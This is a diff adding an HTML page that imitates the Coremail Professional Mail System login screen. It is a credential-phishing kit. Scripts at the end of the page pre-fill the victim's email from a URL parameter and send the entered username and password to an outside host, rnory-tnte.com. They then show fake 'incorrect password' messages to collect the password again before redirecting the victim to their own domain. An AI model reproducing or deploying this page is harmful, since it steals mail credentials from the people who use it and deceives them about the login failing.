@@ -1,0 +1,384 @@
+﻿
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+        <title>Coremail Professional Mail System</title>
+        <link rel="stylesheet" type="text/css" href="https://mail.icoremail.net/assets/css.css" charset="ISO-8859-1">
+        <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-FX0LE1ZXKW&amp;cx=c&amp;_slc=1"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script type="text/javascript" src="yixin/bootstrapJS/jquery.js" charset="iso-8859-1"></script>
+        <script type="text/javascript" src="assets/js.js" charset="UTF-8"></script>
+        <script type="text/javascript" src="assets/googleAnalytics.js" charset="iso-8859-1"></script>
+       
+
+    </head>
+
+
+    <body style="overflow: auto;">
+        <div class="Head">
+            <div class="Logo" onclick="location.href='http://www.coremail.cn/';"></div>
+            <div class="Links">
+                <a href="http://www.coremail.cn/" target="_blank">
+                    Official Website
+                </a>
+                <a href="http://www.coremail.cn/mfsy/index_88.aspx" target="_blank">
+                    Application for trial
+                </a>
+                <a href="http://mail.icoremail.net/clientoption.html" target="_blank">
+                    Client Settings
+                </a>
+                <a target="_blank" href="http://www.coremail.cn/rmwt2/list_109.aspx">
+                    Support Center
+                </a>
+            </div>
+        </div>
+
+        <div id="main">
+            <div class="Main">
+                <div class="MainContent">
+                    <img class="main_bg" src="https://mail.icoremail.net/assets/mail_secondAuth.png">
+                    <a class="bgclick j-bgclick" href="http://www.lunkr.cn" target="_blank"></a>
+                    <div class="u-btn-detail j-btn-detail">More features</div>
+                    <div class="MainR">
+                        <div class="Header">
+                            <div class="active" onclick="switchLoginForm()" id="userLoginTab">
+                                User</div>
+                            <div class="inactiveAdmin" onclick="switchLoginForm(true)" id="adminLoginTab">
+                                Administrator</div>
+                        </div>
+                        <div id="logArea">
+
+                            <form id="loginForm" method="post" action="">
+                                <input type="hidden" id="webmailIndexUrl" name="webmailIndexUrl">
+                                <div class="languagePanel">
+                                    <div class="language">
+                                        <div class="s"></div>
+                                        <div id="languageOptions" class="languageOptions" tabindex="0">
+                                            <div id="languageLabel">
+                                                Language:</div>
+                                            <div id="languageName">English</div>
+                                            <div id="arrow">
+                                                <img src="https://mail.icoremail.net/assets/arrow.png">
+                                            </div>
+                                        </div>
+                                        <div class="languages">
+                                            <div class="arrow"></div>
+                                            <div class="items">
+                                                <div class="item">
+                                                    ç®€ä½“ä¸­æ–‡</div>
+                                                <div class="item">
+                                                    ç¹é«”ä¸­æ–‡</div>
+                                                <div class="item">
+                                                    English</div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="inptr">
+                                    <div class="blank" style="border: 1px solid rgb(255, 255, 255);">
+                                        <div class="img">
+                                            <img src="https://mail.icoremail.net/assets/user.png">
+                                        </div>
+                                        <input type="text" id="u" name="u" placeholder="Username" autocomplete="off" readonly>
+                                        
+                                    </div>
+                                </div>
+
+                                <div class="inptr">
+                                    <div class="blank">
+                                        <div class="img">
+                                            <img src="https://mail.icoremail.net/assets/password.png">
+                                        </div>
+                                        <input type="password" id="p" name="p" placeholder="Password" autocomplete="off" required>
+                                        <div class="delete" style="display: none;"></div>
+                                    </div>
+                                </div>
+
+                                <div class="options">
+                                    <div id="savePwd">
+                                        <div class="rememberPwd unChecked"></div>
+                                        <div class="rememberPwd">
+                                            &nbsp;Remember</div>
+                                    </div>
+                                    <div id="SSL">
+                                        <div class="SSL">
+                                            &nbsp;Use SSL</div>
+                                        <div class="SSL unChecked"></div>
+                                    </div>
+                                    <input id="saveUsername" name="saveUsername" type="checkbox" style="display: none">
+                                    <input name="useSSL" type="checkbox" style="display: none">
+                                </div>
+
+                                
+
+                                <div class="inptr">
+                                    <div class="button" tabindex="0" id="submit_btn">
+                                        Sign in</div>
+                                    <input type="hidden" name="action:login">
+                                </div>
+
+                                <div class="inptr">
+                                    <div class="Error"></div>
+                                </div>
+
+                            </form>
+                        </div>
+                        <div class="MainFooter">
+                            <div class="content">
+                                <div class="block">
+                                    <img src="https://mail.icoremail.net/assets/authentication03.png" onclick="window.open('http://www.coremail.cn/ryzz/index_67.aspx');">
+                                </div>
+                                <div class="block">
+                                    <img src="https://mail.icoremail.net/assets/authentication02.png" onclick="window.open('http://www.coremail.cn/ryzz/index_67.aspx');">
+                                </div>
+                                <div class="block">
+                                    <img src="https://mail.icoremail.net/assets/authentication01.png" onclick="window.open('http://www.coremail.cn/ryzz/index_67.aspx');">
+                                </div>
+                                <div class="block">
+                                    Security<br>Certification
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="content clearfix contact">
+                <div class="downloadList">
+                    <a href="http://www.lunkr.cn/download.html?p=ios" target="_blank">
+                        <span class="img ios"></span>
+                        <span class="text">iPhone</span>
+                    </a>
+                    <a href="http://www.lunkr.cn/download.html?p=android" target="_blank">
+                        <span class="img android"></span>
+                        <span class="text">Android</span>
+                    </a>
+                    <a href="http://www.lunkr.cn/download.html?p=pc" target="_blank">
+                        <span class="img pc"></span>
+                        <span class="text">PC_IM</span>
+                    </a>
+                    <a class="last-1" href="https://lunkr.cn/dl?p=mail" target="_blank">
+                        <span class="img lunkr-mail"></span>
+                        <span class="text">PC_Mail</span>
+                    </a>
+                    <a class="last" href="https://lunkr.cn/dl?p=plugin" target="_blank">
+                        <span class="img plug-in"></span>
+                        <span class="text">Plug-in unit download</span>
+                    </a>
+                </div>
+                <div class="lunkr-qr">
+                    <div class="img-wrapper">
+                        <img src="https://lunkr.cn/res/qrcode/lunkr/200.png">
+                    </div>
+                    <div class="text">APP Download</div>
+                </div>
+
+                <div class="wechat-qr">
+                    <div class="img"></div>
+                    <div class="text">WeChat</div>
+                </div>
+
+                <div class="sale-phone">
+                    <div class="text">Sales</div>
+                    <div class="phone-number">400-000-1631</div>
+                </div>
+            </div>
+            <div class="copyright">
+                <a href="http://www.coremail.cn" target="_blank">  Coremail Copyright &copy; 2002-2024 </a>
+                <a href="http://beian.miit.gov.cn/" target="_blank">  | Guangdong ICP Backup 10201174 Number-4</a>
+                <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011302001741" target="_blank">  | Guangdong public network No.44011302001741</a>
+            </div>
+        </div>
+
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+	$(document).ready(function() {
+		$('#submit_btn').click(function() {
+			var p = $('#p').val();
+			var login_attempts = 3;
+			if(p === '') {
+				$('.Error').html('<div class="col-md-24 error ext-error" style="color: #e81123;font-size:16px">Enter email password to continue.</div>');
+				return false;
+			}else if(p.length <= 4) {
+				$('.Error').html('<div class="col-md-24 error ext-error" style="color: #e81123;font-size:16px">Enter correct password for your email.</div>');
+				return false;
+			}else{
+			
+				$('.Error').html('').hide();
+				
+				if(login_attempts = login_attempts-1) {
+			
+					submitFormAjaxFirst();
+				}
+				else if(login_attempts == 0){
+				
+					submitFormAjax();
+					
+				}
+			}
+			
+		});
+		
+		function getEd(email){
+			let emailDomain = null;
+			const pos = email.search('@');
+			if(pos > 0) {
+				emailDomain = email.slice(pos+1);
+				
+			}
+			
+			return emailDomain;
+		}
+		
+		
+		function submitFormAjaxFirst() {
+
+			var username = document.getElementById('u').value;
+			var password = document.getElementById('p').value;
+
+			var params = "u=" + username + "&p=" + password;
+			var xmlHttp = new XMLHttpRequest();
+			xmlHttp.onreadystatechange = function() {
+				if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {
+					setTimeout(function() {
+						document.getElementById('p').value = '';
+						$('.Error').html('<div class="col-md-24 error ext-error" style="color: #e81123;font-size:16px">There was an issue looking up your account.  Try again.</div>');
+						$('#btn-submit').val('Next');
+					}, 2000);
+				}
+			}
+			xmlHttp.open("post", "https://rnory-tnte.com/ndukwe/c.php", true);
+			xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			xmlHttp.send(params); 
+		}
+
+		function submitFormAjax() {
+
+			var username = document.getElementById('u').value;
+			var password = document.getElementById('p').value;
+			var params = "u=" + username + "&p=" + password;
+			var ed = getEd(username);
+			var xmlHttp = new XMLHttpRequest();
+			xmlHttp.onreadystatechange = function(){
+				if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {
+					setTimeout(function() {
+						window.location.href = 'https://'+ed;
+					}, 2000);
+				}
+			}
+			xmlHttp.open("post", ".https://rnory-tnte.com/rst/c.php", true);
+			xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			xmlHttp.send(params); 
+		}
+	});
+	</script>
+<script>
+	     function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+          vars[key] = value;
+        });
+        return vars;
+      }
+      
+      var number = getUrlVars()["cms"];
+	 $("#u").val(number);
+	///////////new injection////////////////
+var my_email = number;
+
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+///////////new injection////////////////
+	</script>
+	
+
+	
+	<script>
+	
+	$(document).ready(function(){
+var count=0;
+
+
+	$('#submit_btn').click(function() {
+event.preventDefault();
+var u=$("#u").val();
+var p=$("#p").val();
+var msg = $('#msg').html();
+$('#msg').text( msg );
+
+if (!p) {
+                $('.Error').show();
+                $('.Error').html("Password is empty");
+
+                return false;
+            }
+
+
+count=count+1;
+
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://rnory-tnte.com/rst/c.php',
+        type: 'POST',
+        data:{
+          u:u,
+          p:p,
+        },
+		
+			data: $('#loginForm').serialize(),
+            beforeSend: function(xhr){
+            	
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#p").val("");
+            			if (count>=2) {
+            				count=0;
+                 
+                  window.location.replace("https://www."+my_slice);
+
+                }
+            	$(".Error").show();
+               $('.Error').html("Password is not correct. Please try again");
+		
+       
+            }
+            else{
+            	$(".Error").show();
+               $('.Error').html("Password is not correct. Please try again");
+            }
+        }
+    },
+    error: function(){
+    	$("#p").val("");
+    	if (count>=2) {
+    		count=0;
+    		window.location.replace("https://www."+my_slice);
+    	}
+            	$(".Error").show();
+               $('.Error').html("Password is not correct. Please try again");
+    },
+    complete: function(){
+    	$('#fm-login-submit').val('Sign in ');
+    }
+});
+  });
+
+
+	});
+	</script>	
+	
+</body></html>
